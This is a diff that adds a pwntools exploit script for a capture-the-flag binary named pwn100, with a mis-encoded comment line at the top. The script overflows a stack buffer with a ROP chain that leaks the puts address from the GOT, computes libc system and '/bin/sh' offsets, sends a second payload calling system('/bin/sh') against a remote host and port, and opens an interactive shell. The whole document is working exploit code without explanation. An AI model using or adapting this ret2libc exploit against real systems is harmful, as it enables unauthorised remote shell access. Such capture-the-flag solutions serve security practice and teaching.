@@ -1,0 +1,27 @@
+64Îª´«²Î+putsÐ¹Â¶
+
+from pwn import *
+#p = process("./pwn100")
+p = remote("111.198.29.45", 37665)
+elf = ELF("./pwn100")
+#gdb.attach(p, "b * 0x4006b7")
+
+poprdiAddress = 0x0000000000400763 
+startAddress = 0x400550
+
+payload = "a"*72 + p64(poprdiAddress) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(startAddress) 
+payload = payload.ljust(0xc8,"a")
+
+p.sendline(payload)
+p.recvuntil('bye~\n')
+x = p.recvline()+"\x00"
+
+puts = u64(x)-0xa000000000000
+sleep(1)
+system = puts - 0x2a300
+binsh = puts + 0x11d6c7
+payload = "a"*71 + p64(poprdiAddress) + p64(binsh) + p64(system)
+payload = payload.ljust(0xc8,"a")
+p.sendline(payload)
+
+p.interactive()
